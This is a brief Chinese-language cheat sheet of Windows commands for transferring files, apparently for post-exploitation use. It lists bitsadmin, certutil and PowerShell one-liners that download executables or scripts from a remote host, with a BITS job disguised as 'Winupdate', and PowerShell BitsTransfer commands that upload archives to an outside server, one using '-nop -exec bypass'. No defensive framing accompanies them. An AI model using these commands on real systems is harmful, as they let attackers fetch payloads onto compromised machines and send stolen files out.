# 一、下载文件
## 1、cmd
### (1)bitsadmin
```
bitsadmin /transfer Winupdate /download http://xx.xx.xx.xx/example.exe "c:\users\***\desktop\example.exe"
```
### (2)certuil

```
certutil -urlcache -split -f https://www.xxx.com/test.py
certutil -urlcache -split -f https://www.xxx.com/test.py ff.py
```
## 2、powershell
```
powershell (new-object System.Net.WebClient).DownloadFile( 'http://www.xx.com/ff.jpg','c:\aaa.jpg')
```
# 二、上传文件
## 1、powershell
注：需配合搭建配置服务器端IIS，服务器端要开启安装BITS上传组件
### 多行
```
Import-Module BitsTransfer
Start-BitsTransfer -Source file.rar -Destination http://202.182.103.240/upload/file.rar -transfertype upload
```
### 一句话
```
powershell -nop -exec bypass Import-Module BitsTransfer;Start-BitsTransfer -Source avlog.rar -Destination http://xx.xx.xx.xx/upload/example.rar -transfertype upload
```
